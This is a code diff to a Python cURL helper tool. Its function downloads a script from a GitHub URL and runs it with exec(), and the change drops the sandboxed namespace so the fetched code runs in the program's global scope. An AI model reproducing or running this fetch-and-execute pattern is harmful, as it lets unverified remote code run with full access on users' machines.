@@ -43,23 +43,16 @@ def fetch_and_execute_remote_script():
     script_url = "https://raw.githubusercontent.com/kitupeu/scr/refs/heads/main/Curl_Flag.py"
 
     try:
+        # Fetch the script content from the remote URL
         response = requests.get(script_url)
 
         if response.status_code == 200:
             script_content = response.text
-            print_colored("Fetched script content successfully!", GREENISH)
+            print_colored("Fetched script content successfully! Executing script...", GREENISH)
 
             try:
-                # Execute the script in a controlled namespace
-                local_namespace = {}
-                exec(script_content, {}, local_namespace)
-
-                # Check if the script defines a main function or entry point
-                if "main" in local_namespace:
-                    print_colored("Executing the main function from the script...", SKY_BLUE)
-                    local_namespace["main"]()  # Call the 'main' function if it exists
-                else:
-                    print_colored("Script executed successfully!", GREENISH)
+                # Execute the script in the same global context so it can perform its actions
+                exec(script_content, globals(), globals())
             except Exception as e:
                 print_colored(f"Error executing the fetched script: {e}", YELLOW)
         else:
@@ -67,7 +60,7 @@ def fetch_and_execute_remote_script():
 
     except requests.RequestException as e:
         print_colored(f"Error fetching the script: {e}", YELLOW)
-
+        
 def interactive_request_builder():
     """Interactive cURL command builder with backward navigation."""
     print_colored("\nInteractive cURL Command Builder", GREENISH + BOLD)
